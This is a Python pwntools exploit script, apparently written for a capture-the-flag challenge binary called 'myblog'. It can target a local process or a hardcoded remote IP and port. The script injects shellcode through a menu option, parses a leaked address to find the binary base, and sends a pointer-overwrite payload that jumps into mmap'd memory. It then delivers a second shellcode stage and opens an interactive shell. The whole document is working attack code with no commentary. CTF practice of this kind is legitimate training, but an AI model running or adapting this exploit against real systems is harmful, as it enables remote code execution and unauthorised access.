from pwn import *

from shellcode1 import shellcode1
from shellcode2 import shellcode2

if __name__ == '__main__':

    if int(sys.argv[1]) == 1:
        p = process("./myblog")
    elif int(sys.argv[1]) == 2:
        p = process("./myblog")
        gdb.attach(p)
    elif int(sys.argv[1]) == 3:
        p = process("strace ./myblog".split(" "), stderr=2)
    else:
        p = remote('159.65.125.233', 31337)

    p.recvuntil("4. Exit")
    p.sendline("3")
    p.recvuntil("New Owner :")
    p.send(shellcode1)

    p.recvuntil("4. Exit")
    p.sendline("31337")

    p.recvuntil("gift ")
    base = int(p.recvn(14), 16) & 0xFFFFFFFFFFFFF000
    log.info("Base = %#x" % base)

    payload = p64(0xdeadbeef)
    payload += p64(base + 0x202048)  # mmap pointer
    payload += p64(base + 0x0001893) # jmp qword ptr[rbp]
    p.send(payload)

    p.clean(1)
    p.send("\x90"*7 + shellcode2)
    p.interactive()
